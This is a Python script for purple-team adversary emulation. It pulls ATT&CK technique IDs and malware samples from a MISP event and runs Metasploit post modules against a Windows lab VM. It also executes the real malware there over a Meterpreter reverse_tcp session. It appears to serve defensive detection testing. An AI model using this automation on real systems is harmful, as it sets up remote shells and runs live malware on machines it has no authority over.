#TODO
# Implement logic for running TTPs in a sequence
# Save malware analysis logs to MISP
# Create some meaningful reports in MISP
#


from pymisp import PyMISP, MISPEvent
import json
import jmespath
from pymetasploit3.msfrpc import MsfRpcClient
from tenacity import retry, stop_after_delay, wait_fixed
import yaml
import base64
import zipfile
import os 
from termcolor import colored

with open('config.yml', 'r') as file:
    config = yaml.safe_load(file)

MSF_SERVER = config['msf']['server']
MSF_PASSWORD = config['msf']['password']
MSF_RPC_PORT = config['msf']['rpc_port']
MSF_LHOST = config['msf']['LHOST']
MSF_LPORT = config['msf']['LPORT']
MISP_URL = config['misp']['url']
MISP_TOKEN = config['misp']['api_token']
PAYLOAD_DOWNLOAD_PATH = config['misp']['payload_download_path']

main_msf_session_key = 1
main_msf_session = None

MSF_CLIENT = None
MISP_CLIENT = None

@retry(wait=wait_fixed(5))
def init_msf():
    """
    Initialize MSF Connection
    """
    try :
        client = MsfRpcClient(MSF_PASSWORD, port=MSF_RPC_PORT, server=MSF_SERVER, ssl=True)
        print_info("[*] Connected to Metasploit")
        return client
    except Exception as e:
        print_error("[-] Failed to connect to Metasploit - check if msfrpc is running")
        raise Exception("[-] Failed to connect to Metasploit")
    return None

@retry(wait=wait_fixed(5))
def init_misp():
    """
    Initialize MISP Connection
    """
    try:
        misp = PyMISP(MISP_URL, MISP_TOKEN)
        print_info("[*] Connected to MISP")
        return misp
    except Exception as e:
        print_error("[-] Failed to connect to MISP")
        raise Exception("[-] Failed to connect to MISP")
    return None

def read_misp_event(event_id):
    """
    Read a given MISP event
    """
    print()
    print_info(f"[*] Reading Event #{event_id}")
    event = MISP_CLIENT.get_event(event_id)
    event = event['Event']

    attribute_galaxy_clusters = jmespath.search("Attribute[].Galaxy[].GalaxyCluster[]", event) 
    event_galaxy_clusters = jmespath.search("Galaxy[].GalaxyCluster[]", event)
    object_galaxy_clusters = jmespath.search("Object[].Attribute[].Galaxy[].GalaxyCluster[]", event)
    payloads = jmespath.search("Object[].Attribute[?type=='malware-sample'][]", event)
    galaxy_clusters = object_galaxy_clusters + attribute_galaxy_clusters + event_galaxy_clusters

    # Get MITRE TTPs
    print()
    print_info("[*] Found below MITRE ATT&CK TTPs:")
    for item in galaxy_clusters:
        print(f"{item['value']}")
        attck_id = item['meta']['external_id'][0]
        if attck_id.startswith('T'):
            execute_attck(attck_id)
        # purple

    # Get malware samples
    print()
    print_info("[*] Found below Malware Samples")
    for item in payloads:
        download_misp_payload(item)


def download_misp_payload(payload, execute=True):
    """
    Drop payload to Win VM and execute it if set to True
    """
    name, hash = payload['value'].split('|')
    print_info(f"[*] Saving {name} to Windows VM.\n\tHash: {hash}")
    with open(f'{PAYLOAD_DOWNLOAD_PATH}/{name}.zip', 'wb') as w_payload:
        w_payload.write(base64.b64decode(payload['data']))
    
    with zipfile.ZipFile(f'{PAYLOAD_DOWNLOAD_PATH}/{name}.zip') as zip_file:
        zip_file.extractall(pwd=b"infected", path=PAYLOAD_DOWNLOAD_PATH)

    os.rename(f'{PAYLOAD_DOWNLOAD_PATH}/{hash}', f'{PAYLOAD_DOWNLOAD_PATH}/{name}')

    if execute:
        sessions = MSF_CLIENT.sessions.list
        main_msf_session_key = list(sessions.keys())[0]
        print_info(f"[*] Selecting Session {main_msf_session_key}")
        shell = MSF_CLIENT.sessions.session(main_msf_session_key)
        print_info("[*] Executing payload")
        output = shell.run_shell_cmd_with_output(f"powershell.exe C:\\Users\\vagrant\\vagrant_data\\payloads\\{name}", None, exit_shell=False)
        print(output)

@retry(stop=stop_after_delay(300))
def meterpreter_connect():
    """
    Connect to Meterpreter (meterpreter-0.exe running on Win VM)
    """
    global main_msf_session 
    try:
        print()
        print_info("[*] Configuring Metasploit Exploit...")
        exploit = MSF_CLIENT.modules.use('exploit', 'multi/handler')
        payload = MSF_CLIENT.modules.use('payload', 'windows/meterpreter/reverse_tcp')
        payload['LHOST'] = MSF_LHOST
        payload['LPORT'] = MSF_LPORT

        console_id = MSF_CLIENT.consoles.console().cid
        console = MSF_CLIENT.consoles.console(console_id)
        print_info("[*] Listening for connections...")
        console.run_module_with_output(exploit, payload=payload)

        sessions = MSF_CLIENT.sessions.list
        main_msf_session_key = list(sessions.keys())[0]
        main_msf_session = sessions[main_msf_session_key]
        print()
        print_info("[*] Connection successful\n")
        print_info(f"[*] Selecting Session {main_msf_session_key}")
        shell = MSF_CLIENT.sessions.session(main_msf_session_key)
        print_info("[*] Testing shell command\n")
        print(shell.run_shell_cmd_with_output("net accounts", None))
    except Exception:
        print_error("[-] Connection Failed, retrying...")
        raise Exception

def execute_attck(attck_id):
    """
    Execute a Metasploit Purple module that is named as the given ATT&CK ID
    """
    print_info(f"[+] Executing {attck_id.capitalize()}")
    exploit = MSF_CLIENT.modules.use('post', f'windows/purple/{attck_id.lower()}')
    exploit['SESSION'] = main_msf_session_key
    console_id = MSF_CLIENT.consoles.console().cid
    console = MSF_CLIENT.consoles.console(console_id)
    output = console.run_module_with_output(exploit)
    print(output)

def print_error(msg):
    print(colored(msg, 'red'))

def print_info(msg):
    print(colored(msg, 'green'))


def main():
    global MSF_CLIENT
    global MISP_CLIENT
    MSF_CLIENT = init_msf()
    MISP_CLIENT = init_misp()
    meterpreter_connect()
    
    print()
    event_id = input("[*] Input MISP Event ID to emulate: ")
    
    read_misp_event(event_id)

main()
